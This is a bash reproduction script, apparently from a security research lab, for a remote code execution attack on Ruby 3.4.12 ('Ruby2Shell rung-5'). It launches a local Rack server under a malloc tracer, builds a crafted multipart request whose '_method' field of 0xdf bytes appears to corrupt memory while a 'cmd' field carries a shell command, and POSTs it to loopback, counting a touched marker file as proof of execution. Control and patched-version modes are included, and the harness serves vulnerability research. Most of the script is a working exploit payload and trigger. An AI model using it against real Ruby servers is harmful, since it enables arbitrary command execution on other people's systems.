#!/bin/bash
# Loopback-only Ruby2Shell rung-5 experiment. Usage:
#   bash lab/repro/ruby2shell-rung5-http.sh [attack|control|fixed] [tag] [ruby-bin]
set -u
cd "$(dirname "$0")/../.." || exit 1
MODE="${1:-attack}"
TAG="${2:-$MODE-1}"
if [ "$MODE" = fixed ]; then
  RB="${3:-lab/build/plain/ruby-3.4.13-plain/bin/ruby}"
else
  RB="${3:-lab/build/plain/ruby-3.4.12-plain/bin/ruby}"
fi
export GEM_PATH="$PWD/lab/build/plain/ruby-3.4.12-plain/lib/ruby/gems/3.4.0${GEM_PATH:+:$GEM_PATH}"
RU=lab/repro/ruby2shell-rung5-http.ru
EV=lab/build/evidence
PORT=4549
TRACE="$EV/rung5-http-$TAG.trace"
OUT="$EV/rung5-http-$TAG.out"
SERVERLOG="$EV/rung5-http-$TAG.server.log"
MARKER="$EV/rung5-http-$TAG.marker"
mkdir -p "$EV"
rm -f "$MARKER"

build_body() {
  python3 - "$1" "$PWD/$MARKER" <<'PY'
import sys
mode, marker = sys.argv[1:]
data = (b'\xdf' * 828) if mode == 'control' else (b'a' + b'\xdf' * 827)
command = f'/usr/bin/touch {marker}'.encode()
out = [
    b'--XB\r\nContent-Disposition: form-data; name="_method"\r\n'
    b'Content-Type: text/plain; charset=ISO-8859-1\r\n\r\n',
    data,
    b'\r\n--XB\r\nContent-Disposition: form-data; name="cmd"\r\n'
    b'Content-Type: text/plain\r\n\r\n',
    command,
    b'\r\n--XB\r\nContent-Disposition: form-data; name="f"\r\n'
    b'Content-Type: text/plain\r\n\r\nfiller\r\n--XB--\r\n',
]
sys.stdout.buffer.write(b''.join(out))
PY
}

if [ "$MODE" = control ]; then
  RUBY2SHELL_R5_CONTROL=1 RUBY2SHELL_R5_TRACE="$PWD/$TRACE" \
    RUBY2SHELL_R5_MARKER="$PWD/$MARKER" MTRACE_FD=3 \
    LD_PRELOAD="$PWD/lab/preload/mtrace.so" \
    "$RB" "$RU" 3> "$TRACE" > "$SERVERLOG" 2>&1 &
else
  RUBY2SHELL_R5_TRACE="$PWD/$TRACE" RUBY2SHELL_R5_MARKER="$PWD/$MARKER" \
    MTRACE_FD=3 LD_PRELOAD="$PWD/lab/preload/mtrace.so" \
    "$RB" "$RU" 3> "$TRACE" > "$SERVERLOG" 2>&1 &
fi
SRVPID=$!
READY=NO
for _ in $(seq 1 300); do
  if curl -s -m 1 "http://127.0.0.1:$PORT/health" >/dev/null 2>&1; then
    READY=YES
    break
  fi
  sleep 0.1
done
BODY="$EV/rung5-http-$TAG.body"
build_body "$MODE" > "$BODY"
{
  echo "== run $TAG mode=$MODE ruby=$RB $(date -u +%H:%M:%SZ)"
  echo "ready=$READY marker=$MARKER"
  echo '-- trigger:'
  curl -s -m 30 -X POST "http://127.0.0.1:$PORT/trigger" \
    -H 'Content-Type: multipart/form-data; boundary=XB' \
    --data-binary "@$BODY" -w 'HTTP %{http_code}\n'
} > "$OUT" 2>&1
if [ -f "$MARKER" ]; then SEEN=YES; else SEEN=NO; fi
echo "marker-observed=$SEEN" >> "$OUT"
kill "$SRVPID" 2>/dev/null
wait "$SRVPID" 2>/dev/null

TARGET=$(sed -n 's/^target=0x\([0-9a-f]*\).*/\1/p' "$TRACE" | head -1)
POPLINE=0
[ -n "$TARGET" ] && POPLINE=$(grep -c "^M [0-9]* 3e9 $TARGET " "$TRACE" || true)
cat "$OUT"
cat "$SERVERLOG"
echo "== $TAG marker=$SEEN pop-at-target=$POPLINE"
if [ "$MODE" = attack ]; then
  if [ "$READY" = YES ] && [ "$SEEN" = YES ] && [ "$POPLINE" -ge 1 ] &&
     grep -q 'rce=OBSERVED' "$OUT"; then
    echo 'PASS: target-process command side effect'
    exit 0
  fi
  echo 'FAIL'
  exit 1
fi
if [ "$READY" = YES ] && [ "$SEEN" = NO ] && [ "$POPLINE" -eq 0 ] &&
   grep -q 'rce=ABSENT' "$OUT"; then
  echo 'PASS: control marker absent, clean response, no poisoned pop'
  exit 0
fi
echo 'FAIL'
exit 1
